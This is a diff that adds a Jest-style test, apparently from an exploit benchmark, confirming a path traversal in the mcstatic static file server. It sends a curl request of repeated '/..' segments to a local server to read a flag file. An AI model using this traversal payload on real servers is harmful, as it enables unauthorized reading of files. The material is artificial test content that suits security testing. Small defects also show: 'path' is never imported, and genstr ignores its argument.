@@ -1,0 +1,31 @@
+test("Path Traversal in mcstatic", (done) => {
+  const { exploitFunction } = require("./function.js");
+  const { getPayload } = require('./payload.js');
+
+  const payload = getPayload();
+  exploitFunction(payload);
+
+  // Wait for the server to process the request
+  setTimeout(() => {
+    // Read the flag file content
+    const fs = require("fs");
+    const pathToFlag = path.resolve(__dirname, "../flag.html");
+    const hostsFile = fs.readFileSync(pathToFlag).toString();
+
+    // Execute the attack again to capture the output
+    const { exec } = require("child_process");
+    exec(`curl -s "http://127.0.0.1:8080${genstr(50)}`, (error, stdout) => {
+      if (error) {
+        console.error(`Error capturing output: ${error}`);
+        return;
+      }
+      expect(stdout).toBe(hostsFile);
+      done();
+    });
+  }, 2000); // Adjust the timeout as needed
+});
+
+// Helper function to generate the path traversal string
+function genstr(n) {
+  return "/..".repeat(50) + path.resolve(__dirname, "../flag.html");
+}
